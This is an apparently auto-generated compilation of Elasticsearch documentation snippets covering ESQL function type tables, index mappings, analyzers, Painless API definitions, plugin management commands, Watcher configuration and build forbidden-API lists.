DESCRIPTION: This Java class sets up the YAML REST test suite for the Elasticsearch plugin. It extends ESClientYamlSuiteTestCase to integrate with Elasticsearch's testing framework.

LANGUAGE: java
CODE:
import com.carrotsearch.randomizedtesting.annotations.Name;
import com.carrotsearch.randomizedtesting.annotations.ParametersFactory;
import org.elasticsearch.test.rest.yaml.ClientYamlTestCandidate;
import org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase;

public class HelloWorldPluginClientYamlTestSuiteIT extends ESClientYamlSuiteTestCase {

    public HelloWorldPluginClientYamlTestSuiteIT(
            @Name("yaml") ClientYamlTestCandidate testCandidate
    ) {
        super(testCandidate);
    }

    @ParametersFactory
    public static Iterable<Object[]> parameters() throws Exception {
        return ESClientYamlSuiteTestCase.createParameters();
    }
}

----------------------------------------

TITLE: Type Support Matrix for ESQL Function
DESCRIPTION: A markdown table documenting the supported field types and their corresponding result types for an ESQL function. Shows that date_period, keyword, and text field types all produce date_period results.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| date_period | date_period |
| keyword | date_period |
| text | date_period |

----------------------------------------

TITLE: Configuring Custom position_increment_gap in Mapping
DESCRIPTION: Demonstrates how to set a custom position_increment_gap value of 0 in the mapping, allowing phrase queries to match terms across different array elements without requiring slop.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "names": {
        "type": "text",
        "position_increment_gap": 0
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "names": [ "John Abraham", "Lincoln Smith"]
}

GET my-index-000001/_search
{
  "query": {
    "match_phrase": {
      "names": "Abraham Lincoln"
    }
  }
}

----------------------------------------

TITLE: Configuring Transform Node Role in Elasticsearch YAML
DESCRIPTION: This YAML configuration sets the node role to 'transform', identifying it as a transform node. It's recommended to also include the 'remote_cluster_client' role for cross-cluster search functionality.

LANGUAGE: yaml
CODE:
node.roles: [ transform ]

----------------------------------------

TITLE: Analyzing Text with Default Stemmer Filter in Elasticsearch
DESCRIPTION: Example of using the analyze API with the default porter stemming algorithm to process text. Shows how 'the foxes jumping quickly' is stemmed to basic word forms.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "standard",
  "filter": [ "stemmer" ],
  "text": "the foxes jumping quickly"
}

LANGUAGE: text
CODE:
[ the, fox, jump, quickli ]

----------------------------------------

TITLE: ESQL Function Named Parameters
DESCRIPTION: Shows how to use named parameters in ESQL functions, including an example with the 'match' function and query parameters.

LANGUAGE: esql
CODE:
FROM library
| WHERE match(author, "Frank Herbert", {"minimum_should_match": 2, "operator": "AND"})
| LIMIT 5

LANGUAGE: esql
CODE:
FROM library
| EVAL year = DATE_EXTRACT("year", release_date)
| WHERE page_count > ? AND match(author, ?, {"minimum_should_match": ?})
| LIMIT 5

----------------------------------------

TITLE: Indexing a LineString shape in WKT format
DESCRIPTION: Example of indexing a linestring shape using the Well-Known Text (WKT) format in Elasticsearch. LineStrings are defined by two or more positions.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "LINESTRING (-377.03653 389.897676, -377.009051 389.889939)"
}

----------------------------------------

TITLE: Including Add Operator Type Information in Markdown
DESCRIPTION: This snippet includes additional type information for the add operator from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../types/add.md
:::

----------------------------------------

TITLE: String Type Mapping Table in Markdown
DESCRIPTION: A markdown table showing how different string types (keyword and text) map to result types in ESQL functions. Both keyword and text input types map to keyword output type.

LANGUAGE: markdown
CODE:
| string | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: Configuring Kuromoji Tokenizer with Inline User Dictionary Rules
DESCRIPTION: This snippet demonstrates how to configure the kuromoji_tokenizer with user dictionary rules defined inline in the tokenizer definition, instead of using an external file.

LANGUAGE: json
CODE:
PUT kuromoji_sample
{
  "settings": {
    "index": {
      "analysis": {
        "tokenizer": {
          "kuromoji_user_dict": {
            "type": "kuromoji_tokenizer",
            "mode": "extended",
            "user_dictionary_rules": ["東京スカイツリー,東京 スカイツリー,トウキョウ スカイツリー,カスタム名詞"]
          }
        },
        "analyzer": {
          "my_analyzer": {
            "type": "custom",
            "tokenizer": "kuromoji_user_dict"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Watcher encryption settings in YAML
DESCRIPTION: YAML configuration for enabling encryption of sensitive data in Watcher and specifying the encryption key file path.

LANGUAGE: yaml
CODE:
xpack.watcher.encrypt_sensitive_data: true
xpack.watcher.encryption_key: /path/to/encryption/key/file

----------------------------------------

TITLE: Creating Test Data with ROW in ESQL
DESCRIPTION: The ROW source command produces a row with one or more columns with specified values. Useful for testing.

LANGUAGE: esql
CODE:
ROW a = 1, b = "two", c = null

LANGUAGE: esql
CODE:
ROW a = [2, 1]

LANGUAGE: esql
CODE:
ROW a = ROUND(1.23, 0)

----------------------------------------

TITLE: Value Matching Query in KQL
DESCRIPTION: Examples of exact value matching queries for different field types including keyword, text, and escaped characters.

LANGUAGE: yaml
CODE:
http.request.method: GET

LANGUAGE: yaml
CODE:
Hello

LANGUAGE: yaml
CODE:
http.request.body.content: "null pointer"

LANGUAGE: yaml
CODE:
http.request.referrer: "https://example.com"

----------------------------------------

TITLE: Extracting X Coordinate in Elasticsearch SQL
DESCRIPTION: The ST_X function returns the longitude of the first point in a geometry. It takes a geometry input and returns a double output.

LANGUAGE: sql
CODE:
SELECT ST_X(ST_WKTToSQL('POINT (10 20)')) x;

----------------------------------------

TITLE: Installing Elasticsearch Azure Discovery Plugin
DESCRIPTION: Commands to install the Elasticsearch Azure Discovery plugin on the VM instance.

LANGUAGE: sh
CODE:
sudo /usr/share/elasticsearch/bin/elasticsearch-plugin install discovery-azure-classic

----------------------------------------

TITLE: Expanding All Top-Level Dotted Fields in Elasticsearch
DESCRIPTION: This configuration shows how to use the dot expander processor to expand all top-level fields with dots in their names by setting the 'field' option to '*'.

LANGUAGE: json
CODE:
{
  "dot_expander": {
    "field": "*"
  }
}

----------------------------------------

TITLE: GET Response with Sequence Information
DESCRIPTION: Example response from GET API showing the document's current sequence number and primary term along with its content.

LANGUAGE: console
CODE:
{
  "_index": "products",
  "_id": "1567",
  "_version": 1,
  "_seq_no": 362,
  "_primary_term": 2,
  "found": true,
  "_source": {
    "product": "r2d2",
    "details": "A resourceful astromech droid"
  }
}

----------------------------------------

TITLE: Displaying Inequality Operator Image in Markdown
DESCRIPTION: This snippet displays an image of the inequality operator using Markdown syntax. It includes alt text and CSS class for centering.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/operators/not_equals.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Displaying Inequality Operator Image in Markdown
DESCRIPTION: This snippet displays an image of the inequality operator using Markdown syntax. It includes alt text and CSS class for centering.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/operators/not_equals.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Using Custom Executors in Elasticsearch
DESCRIPTION: Recommends using executors from org.elasticsearch.common.util.concurrent.EsExecutors instead of Java's built-in executor services to properly handle Errors.

LANGUAGE: java
CODE:
@defaultMessage use executors from org.elasticsearch.common.util.concurrent.EsExecutors instead which will properly bubble up Errors
java.util.concurrent.AbstractExecutorService#<init>()
java.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue)
java.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue, java.util.concurrent.ThreadFactory)
java.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue, java.util.concurrent.RejectedExecutionHandler)
java.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue, java.util.concurrent.ThreadFactory, java.util.concurrent.RejectedExecutionHandler)

----------------------------------------

TITLE: Parsing ISO 8601 Datetime in Painless
DESCRIPTION: Shows how to parse an ISO 8601 formatted datetime string into a ZonedDateTime object.

LANGUAGE: painless
CODE:
String datetime = '1983-10-13T22:15:30Z';
ZonedDateTime zdt = ZonedDateTime.parse(datetime);

----------------------------------------

TITLE: Defining Parameters for ESQL Time Difference Function Test
DESCRIPTION: This snippet defines the parameters used in testing the time difference function in ESQL. It specifies the unit of time difference and the start and end timestamps as strings.

LANGUAGE: markdown
CODE:
**Parameters**

`unit`
:   Time difference unit

`startTimestamp`
:   A string representing a start timestamp

`endTimestamp`
:   A string representing an end timestamp

----------------------------------------

TITLE: Defining Java Internal API Exclusions for Elasticsearch Third-Party Audit
DESCRIPTION: This snippet lists Java internal API packages that should be excluded from third-party dependency checks in Elasticsearch. It includes packages from com.oracle, com.sun, jdk.internal, and sun namespaces.

LANGUAGE: text
CODE:
@defaultMessage non-public internal runtime class
com.oracle.webservices.internal.**
com.oracle.xmlns.internal.**
com.sun.activation.registries.**
com.sun.browser.**
com.sun.corba.se.**
com.sun.glass.**
com.sun.imageio.**
com.sun.istack.internal.**
com.sun.javafx.**
com.sun.jmx.**
com.sun.media.**
com.sun.media.sound.**
com.sun.naming.internal.**
com.sun.openpisces.**
com.sun.org.apache.bcel.internal.**
com.sun.org.apache.regexp.internal.**
com.sun.org.apache.xalan.internal.extensions.**
com.sun.org.apache.xalan.internal.lib.**
com.sun.org.apache.xalan.internal.res.**
com.sun.org.apache.xalan.internal.templates.**
com.sun.org.apache.xalan.internal.utils.**
com.sun.org.apache.xalan.internal.xslt.**
com.sun.org.apache.xalan.internal.xsltc.cmdline.**
com.sun.org.apache.xalan.internal.xsltc.compiler.**
com.sun.org.apache.xalan.internal.xsltc.trax.**
com.sun.org.apache.xalan.internal.xsltc.util.**
com.sun.org.apache.xerces.internal.**
com.sun.org.apache.xml.internal.res.**
com.sun.org.apache.xml.internal.security.**
com.sun.org.apache.xml.internal.serializer.utils.**
com.sun.org.apache.xml.internal.utils.**
com.sun.org.apache.xpath.internal.**
com.sun.org.glassfish.**
com.sun.pisces.**
com.sun.prism.**
com.sun.proxy.**
com.sun.scenario.**
com.sun.t2k.**
com.sun.webkit.**
com.sun.xml.internal.**
jdk.internal.**
jdk.management.resource.internal.**
jdk.nashorn.internal.**
jdk.nashorn.tools.**
oracle.jrockit.jfr.**
org.jcp.xml.dsig.internal.**
sun.**

----------------------------------------

TITLE: Defining Java Util Collection Interface in Painless
DESCRIPTION: This snippet defines the java.util.Collection interface with its methods and augmentations for use in Painless scripts.

LANGUAGE: Java
CODE:
class java.util.Collection {
  boolean add(def)
  boolean addAll(Collection)
  void clear()
  boolean contains(def)
  boolean containsAll(Collection)
  boolean isEmpty()
  boolean removeAll(Collection)
  boolean removeIf(Predicate)
  boolean retainAll(Collection)
  int size()
  Spliterator spliterator()
  Stream stream()
  def[] toArray()
  def[] toArray(def[])

  # some adaptations of groovy methods
  List org.elasticsearch.painless.api.Augmentation collect(Function)
  def org.elasticsearch.painless.api.Augmentation collect(Collection,Function)
  def org.elasticsearch.painless.api.Augmentation find(Predicate)
  List org.elasticsearch.painless.api.Augmentation findAll(Predicate)
  def org.elasticsearch.painless.api.Augmentation findResult(Function)
  def org.elasticsearch.painless.api.Augmentation findResult(def,Function)
  List org.elasticsearch.painless.api.Augmentation split(Predicate)
}

----------------------------------------

TITLE: Complex Filtering of SHOW FUNCTIONS in Elasticsearch SQL
DESCRIPTION: Example of using the SHOW FUNCTIONS command with a more complex wildcard pattern to filter functions containing 'DAY' in their name.

LANGUAGE: sql
CODE:
SHOW FUNCTIONS LIKE '%DAY%';

     name      |     type
---------------+---------------
DAY            |SCALAR
DAYNAME        |SCALAR
DAYOFMONTH     |SCALAR
DAYOFWEEK      |SCALAR
DAYOFYEAR      |SCALAR
DAY_NAME       |SCALAR
DAY_OF_MONTH   |SCALAR
DAY_OF_WEEK    |SCALAR
DAY_OF_YEAR    |SCALAR
HOUR_OF_DAY    |SCALAR
ISODAYOFWEEK   |SCALAR
ISO_DAY_OF_WEEK|SCALAR
MINUTE_OF_DAY  |SCALAR
TODAY          |SCALAR

----------------------------------------

TITLE: Elasticsearch Reset Password Command Synopsis
DESCRIPTION: Command line syntax showing all available options for the elasticsearch-reset-password tool.

LANGUAGE: shell
CODE:
bin/elasticsearch-reset-password
[-a, --auto] [-b, --batch] [-E <KeyValuePair]
[-f, --force] [-h, --help] [-i, --interactive]
[-s, --silent] [-u, --username] [--url] [-v, --verbose]

----------------------------------------

TITLE: Removing Ukrainian Analysis Plugin from Elasticsearch
DESCRIPTION: Command to remove the Ukrainian analysis plugin from Elasticsearch. The node must be stopped before removing the plugin.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove analysis-ukrainian

----------------------------------------

TITLE: Counting Rehired Employees in ESQL
DESCRIPTION: Query that counts the number of employees who have been rehired by filtering non-NULL is_rehired values and using the COUNT aggregate function on employee numbers.

LANGUAGE: esql
CODE:
FROM employees
| WHERE is_rehired IS NOT NULL
| STATS COUNT(emp_no)

----------------------------------------

TITLE: Including TO_LONG Function Parameters in Markdown
DESCRIPTION: This snippet includes the markdown file containing the parameters for the TO_LONG function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/to_long.md
:::

----------------------------------------

TITLE: Avoiding Direct Socket Connections in Elasticsearch
DESCRIPTION: Prohibits direct socket connections using various Java networking classes to prevent potential security issues or uncontrolled network access.

LANGUAGE: java
CODE:
@defaultMessage Don't open socket connections
java.net.URL#openStream()
java.net.URLConnection#connect()
java.net.URLConnection#getInputStream()
java.net.Socket#connect(java.net.SocketAddress)
java.net.Socket#connect(java.net.SocketAddress, int)
java.nio.channels.SocketChannel#open(java.net.SocketAddress)
java.nio.channels.SocketChannel#connect(java.net.SocketAddress)

----------------------------------------

TITLE: Elasticsearch Aggregation with Normalized Keywords
DESCRIPTION: Demonstrates how aggregations return normalized values when using a normalizer on keyword fields.

LANGUAGE: console
CODE:
GET index/_search
{
  "size": 0,
  "aggs": {
    "foo_terms": {
      "terms": {
        "field": "foo"
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Classic Tokenizer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the classic tokenizer to analyze a sample text. It shows the POST request to the _analyze endpoint with the tokenizer and text specified.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "classic",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Displaying MV_LAST Function Syntax Diagram
DESCRIPTION: This snippet shows how to include an image of the MV_LAST function syntax diagram in the documentation using Markdown image syntax.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/mv_last.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Setting Basic JVM Options
DESCRIPTION: Examples of JVM option syntax for different Java versions. Shows how to apply settings globally or to specific Java versions.

LANGUAGE: text
CODE:
-Xmx2g
17:-Xmx2g
17-18:-Xmx2g
17-:-Xmx2g

----------------------------------------

TITLE: Deleting an Elasticsearch Service Token
DESCRIPTION: Example of deleting a specific service account token ('my-token') for the 'elastic/fleet-server' service account.

LANGUAGE: shell
CODE:
bin/elasticsearch-service-tokens delete elastic/fleet-server my-token

----------------------------------------

TITLE: ESQL Function Parameter Documentation
DESCRIPTION: Documentation block specifying a field parameter that accepts single or multi-valued columns or expressions as input.

LANGUAGE: markdown
CODE:
`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Creating Documents Without Immediate Refresh in Elasticsearch
DESCRIPTION: These examples show how to create a document without triggering an immediate refresh. The refresh parameter is either omitted or set to false, which is the default behavior.

LANGUAGE: console
CODE:
PUT /test/_doc/3
{"test": "test"}
PUT /test/_doc/4?refresh=false
{"test": "test"}

----------------------------------------

TITLE: Defining Supported Types for ESQL Function in Markdown
DESCRIPTION: This markdown table defines the supported input types and their corresponding result types for an ESQL function. It shows that double inputs result in double outputs, while both integer and long inputs result in long outputs.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | long |
| long | long |

----------------------------------------

TITLE: Configuring Enabled Setting for Object Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the 'enabled' setting for an object field in an Elasticsearch mapping. It shows the creation of an index with a disabled 'session_data' field and the indexing of documents with arbitrary data in that field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "user_id": {
        "type":  "keyword"
      },
      "last_updated": {
        "type": "date"
      },
      "session_data": {
        "type": "object",
        "enabled": false
      }
    }
  }
}

PUT my-index-000001/_doc/session_1
{
  "user_id": "kimchy",
  "session_data": {
    "arbitrary_object": {
      "some_array": [ "foo", "bar", { "baz": 2 } ]
    }
  },
  "last_updated": "2015-12-06T18:20:22"
}

PUT my-index-000001/_doc/session_2
{
  "user_id": "jpountz",
  "session_data": "none",
  "last_updated": "2015-12-06T18:22:13"
}

----------------------------------------

TITLE: Setting Node Attributes via Command Line
DESCRIPTION: Demonstrates how to set custom node attributes using command line arguments when starting an Elasticsearch node.

LANGUAGE: sh
CODE:
./bin/elasticsearch -Enode.attr.rack_id=rack_one

----------------------------------------

TITLE: Creating Custom Analyzer with Stemmer Filter
DESCRIPTION: Shows how to create a custom analyzer using the stemmer filter with the create index API. Demonstrates configuration of analysis settings with a whitespace tokenizer.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "whitespace",
          "filter": [ "stemmer" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: ESQL Identifier Quoting
DESCRIPTION: Shows how to quote identifiers in ESQL using backticks when they don't follow standard naming conventions or contain special characters.

LANGUAGE: esql
CODE:
FROM index
| KEEP `1.field`

LANGUAGE: esql
CODE:
FROM index
| STATS COUNT(`1.field`)
| EVAL my_count = `COUNT(``1.field``)`

----------------------------------------

TITLE: Creating Text Field with Default Index Prefixes
DESCRIPTION: Demonstrates how to create a text field using default prefix length settings (min_chars=2, max_chars=5) for prefix indexing.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "body_text": {
        "type": "text",
        "index_prefixes": { }    
      }
    }
  }
}

----------------------------------------

TITLE: Defining Supported Types for ESQL Function Test Case in Markdown
DESCRIPTION: This markdown table outlines the supported field types, query types, and result types for an ESQL function test case. It covers combinations of keyword and text types for fields and queries, all resulting in boolean outcomes.

LANGUAGE: markdown
CODE:
| field | query | result |
| --- | --- | --- |
| keyword | keyword | boolean |
| keyword | text | boolean |
| text | keyword | boolean |
| text | text | boolean |

----------------------------------------

TITLE: Installing Stempel Plugin in Elasticsearch
DESCRIPTION: Command to install the Stempel Polish analysis plugin using Elasticsearch's plugin manager. Must be run on every node in the cluster with sudo privileges.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install analysis-stempel

----------------------------------------

TITLE: Frequent Item Sets Aggregation with Filter
DESCRIPTION: Example of a frequent item sets aggregation with a filter to narrow results to specific geographic locations.

LANGUAGE: console
CODE:
POST /kibana_sample_data_ecommerce/_async_search
{
  "size": 0,
  "aggs": {
    "my_agg": {
      "frequent_item_sets": {
        "minimum_set_size": 3,
        "fields": [
          { "field": "category.keyword" },
          { "field": "geoip.city_name" }
        ],
        "size": 3,
        "filter": {
          "term": {
            "geoip.continent_name": "Europe"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running Microsoft Teams Connector Docker Container
DESCRIPTION: Shell command for running the Microsoft Teams connector Docker container. This command mounts the configuration file and sets up the necessary network and environment for the connector to operate.

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Adding Documents to Elasticsearch (Version 5)
DESCRIPTION: Adds a document to the Elasticsearch index for version 5, including title, content, and creation date fields.

LANGUAGE: json
CODE:
POST /index/my_type
{
  "title": "Title 5",
  "content": "Elasticsearch is a powerful search engine.",
  "created_at": "2024-12-16"
}

----------------------------------------

TITLE: Response from nori_readingform Token Filter Analysis in Elasticsearch
DESCRIPTION: This snippet shows the response from Elasticsearch after analyzing text using the nori_readingform token filter. It demonstrates how the Hanja characters are converted to their Hangul equivalent.

LANGUAGE: console-result
CODE:
{
  "tokens" : [ {
    "token" : "향가",     <1>
    "start_offset" : 0,
    "end_offset" : 2,
    "type" : "word",
    "position" : 0
  }]
}

----------------------------------------

TITLE: ESQL Cast Operation for Floating Point Division
DESCRIPTION: Demonstrates how to use the CAST operator to convert integer division to floating point division in ESQL. The CAST operator converts one of the integer operands to DOUBLE type before division to ensure floating point arithmetic.

LANGUAGE: esql
CODE:
CAST(value AS DOUBLE)

----------------------------------------

TITLE: Executing Watcher with Condition Script in Elasticsearch
DESCRIPTION: This example demonstrates a Watcher execution with a Painless condition script. The script checks if any theater's revenue is below $15,000 or above $50,000 using Java Stream API.

LANGUAGE: json
CODE:
POST _watcher/watch/_execute
{
  "watch" : {
    "trigger" : { "schedule" : { "interval" : "24h" } },
    "input" : {
      "search" : {
        "request" : {
          "indices" : [ "seats" ],
          "body" : {
            "query" : {
              "term": { "sold": "true"}
            },
            "aggs" : {
              "theatres" : {
                "terms" : { "field" : "play" },
                "aggs" : {
                  "money" : {
                    "sum": { "field" : "cost" }
                  }
                }
              }
            }
          }
        }
      }
    },
    "condition" : {
      "script" :
      """
        return ctx.payload.aggregations.theatres.buckets.stream()       <1>
          .filter(theatre -> theatre.money.value < 15000 ||
                             theatre.money.value > 50000)               <2>
          .count() > 0                                                  <3>
      """
    },
    "actions" : {
      "my_log" : {
        "logging" : {
          "text" : "The output of the search was : {{ctx.payload.aggregations.theatres.buckets}}"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Removing Azure Classic Discovery Plugin from Elasticsearch
DESCRIPTION: Command to remove the discovery-azure-classic plugin from Elasticsearch. The node must be stopped before plugin removal.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove discovery-azure-classic

----------------------------------------

TITLE: Displaying ST_CENTROID_AGG Function Syntax in Markdown
DESCRIPTION: This snippet shows how to include an image of the ST_CENTROID_AGG function syntax in a Markdown document.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/st_centroid_agg.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Incrementing a Long Counter in Java for Elasticsearch Metrics
DESCRIPTION: Demonstrates how to register and use a synchronous LongCounter instrument with MeterRegistry. The counter is incremented with and without attributes.

LANGUAGE: java
CODE:
MeterRegistry registry;
LongCounter longCounter = registry.registerLongCounter("es.test.requests.count", "a test counter", "count");
longCounter.increment();
longCounter.incrementBy(1, Map.of("name", "Alice"));
longCounter.incrementBy(1, Map.of("name", "Bob"));

----------------------------------------

TITLE: Defining Elasticsearch Scripting API Classes
DESCRIPTION: Defines various classes used in Elasticsearch scripting, including GeoPoint, GeoBoundingBox, and different ScriptDocValues types for handling various data types in scripts.

LANGUAGE: painless
CODE:
class org.elasticsearch.common.geo.GeoPoint {
  ()
  (double, double)
  double getLat()
  double getLon()
}

class org.elasticsearch.common.geo.GeoBoundingBox {
  org.elasticsearch.common.geo.GeoPoint topLeft()
  org.elasticsearch.common.geo.GeoPoint bottomRight()
}

class org.elasticsearch.index.fielddata.ScriptDocValues$Strings {
  String get(int)
  String getValue()
}

class org.elasticsearch.index.fielddata.ScriptDocValues$Longs {
  Long get(int)
  long getValue()
}

class org.elasticsearch.index.fielddata.ScriptDocValues$Dates {
  ZonedDateTime get(int)
  ZonedDateTime getValue()
}

class org.elasticsearch.index.fielddata.ScriptDocValues$Doubles {
  Double get(int)
  double getValue()
}

class org.elasticsearch.index.fielddata.ScriptDocValues$Geometry {
  int getDimensionalType()
  org.elasticsearch.common.geo.GeoPoint getCentroid()
  org.elasticsearch.common.geo.GeoBoundingBox getBoundingBox()
  org.elasticsearch.common.geo.GeoPoint getLabelPosition()
  double getMercatorWidth()
  double getMercatorHeight()
}

class org.elasticsearch.index.fielddata.ScriptDocValues$GeoPoints {
  org.elasticsearch.common.geo.GeoPoint get(int)
  org.elasticsearch.common.geo.GeoPoint getValue()
  double getLat()
  double getLon()
  double[] getLats()
  double[] getLons()

  # geo distance functions
  double arcDistance(double,double)
  double arcDistanceWithDefault(double,double,double)
  double planeDistance(double,double)
  double planeDistanceWithDefault(double,double,double)
  double geohashDistance(String)
  double geohashDistanceWithDefault(String,double)
}

class org.elasticsearch.index.fielddata.ScriptDocValues$Booleans {
  Boolean get(int)
  boolean getValue()
}

class org.elasticsearch.index.fielddata.ScriptDocValues$BytesRefs {
  BytesRef get(int)
  BytesRef getValue()
}

----------------------------------------

TITLE: Running Java Unit Tests for APM Ingest Plugin
DESCRIPTION: This command executes Java unit tests that cover basic, low-level details of the plugin, such as parsing and loading of resources.

LANGUAGE: bash
CODE:
./gradlew x-pack:plugin:apm-data:test

----------------------------------------

TITLE: Running Terms Aggregation on Pre-aggregated Data in Elasticsearch
DESCRIPTION: This snippet shows how to perform a terms aggregation on the indexed pre-aggregated data, demonstrating the effect of the _doc_count field on the results.

LANGUAGE: console
CODE:
GET /_search
{
    "aggs" : {
        "histogram_titles" : {
            "terms" : { "field" : "my_text" }
        }
    }
}

----------------------------------------

TITLE: Running a Specific EQL Query Test with Gradle
DESCRIPTION: Executes a single EQL query test by specifying the query number.

LANGUAGE: shell
CODE:
./gradlew ':x-pack:plugin:eql:qa:correctness:javaRestTest' --tests "org.elasticsearch.xpack.eql.EsEQLCorrectnessIT.test {<queryNo>}"

----------------------------------------

TITLE: Removing Kuromoji Plugin from Elasticsearch
DESCRIPTION: Command to remove the Japanese Kuromoji analysis plugin from Elasticsearch. The node must be stopped before executing this command.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove analysis-kuromoji

----------------------------------------

TITLE: Creating Source Index with Settings and Mappings in Elasticsearch
DESCRIPTION: Creates an initial source index with specific settings for shard count and write blocks, plus a basic text field mapping.

LANGUAGE: console
CODE:
PUT /my-index
{
  "settings": {
    "index": {
      "number_of_shards": 3,
      "blocks.write": true
    }
  },
  "mappings": {
    "properties": {
        "field1": { "type": "text" }
    }
  }
}

----------------------------------------

TITLE: ESQL Data Type Mappings Table
DESCRIPTION: Markdown table showing the mapping between field types and their corresponding limit, order, and result types for ESQL functions. The table includes common data types like boolean, date, numeric types, IP addresses, and text fields.

LANGUAGE: markdown
CODE:
| field | limit | order | result |
| --- | --- | --- | --- |
| boolean | integer | keyword | boolean |
| date | integer | keyword | date |
| double | integer | keyword | double |
| integer | integer | keyword | integer |
| ip | integer | keyword | ip |
| keyword | integer | keyword | keyword |
| long | integer | keyword | long |
| text | integer | keyword | keyword |

----------------------------------------

TITLE: Configuring Elasticsearch for GCE Discovery Testing
DESCRIPTION: YAML configuration for setting up Elasticsearch to use GCE discovery. It specifies the GCE project ID, zone, and sets the discovery seed provider to GCE.

LANGUAGE: yaml
CODE:
cloud:
  gce:
      project_id: es-cloud
      zone: europe-west1-a
discovery:
      seed_providers: gce

----------------------------------------

TITLE: Including TO_LOWER Function Parameters in Markdown
DESCRIPTION: This snippet includes the parameters for the TO_LOWER function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/to_lower.md
:::

----------------------------------------

TITLE: Working with Reference Types in Painless
DESCRIPTION: Demonstrates various operations with reference types, including declaration, method calls, and sharing instances.

LANGUAGE: painless
CODE:
List l = new ArrayList();
l.add(1);
int i = l.get(0) + 2;

List l0 = new ArrayList();
List l1 = l0;
l0.add(1);
l1.add(2);
int i = l1.get(0) + l0.get(1);

int i = Integer.MAX_VALUE;
long l = Long.parseLong("123L");

----------------------------------------

TITLE: Installing Azure Classic Discovery Plugin in Elasticsearch
DESCRIPTION: Command to install the discovery-azure-classic plugin using Elasticsearch's plugin manager. The plugin must be installed on all cluster nodes, requiring a restart after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install discovery-azure-classic

----------------------------------------

TITLE: SPLIT Function Documentation Header
DESCRIPTION: Header section of the SPLIT function documentation indicating it is auto-generated and should not be edited manually.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Performing Multiplication in Elasticsearch SQL
DESCRIPTION: Demonstrates the use of the multiplication operator (*) in an Elasticsearch SQL query. This operation multiplies two numeric values and returns the product.

LANGUAGE: sql
CODE:
SELECT 2 * 3 AS x;

----------------------------------------

TITLE: Defining ZoneRules Class Methods
DESCRIPTION: Details the ZoneRules class which manages timezone rules including daylight savings calculations and offset transitions.

LANGUAGE: java
CODE:
class java.time.zone.ZoneRules {
  Duration getDaylightSavings(Instant)
  ZoneOffset getOffset(Instant)
  ZoneOffset getStandardOffset(Instant)
  ZoneOffsetTransition getTransition(LocalDateTime)
  List getTransitionRules()
  List getTransitions()
  List getValidOffsets(LocalDateTime)
  boolean isDaylightSavings(Instant)
  boolean isFixedOffset()
  boolean isValidOffset(LocalDateTime,ZoneOffset)
  ZoneOffsetTransition nextTransition(Instant)
  ZoneRules of(ZoneOffset)
  ZoneRules of(ZoneOffset,ZoneOffset,List,List,List)
  ZoneOffsetTransition previousTransition(Instant)
}

----------------------------------------

TITLE: Including TOP Function Description in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the description of the TOP function.

LANGUAGE: markdown
CODE:
:::{include} ../description/top.md
:::

----------------------------------------

TITLE: Defining Date Field Script Classes in Painless for Elasticsearch
DESCRIPTION: Declares two classes required for Painless to find and use date field scripts. These classes are marked with @no_import to prevent them from being imported directly in scripts.

LANGUAGE: painless
CODE:
class org.elasticsearch.script.DateFieldScript @no_import {
}
class org.elasticsearch.script.DateFieldScript$Factory @no_import {
}

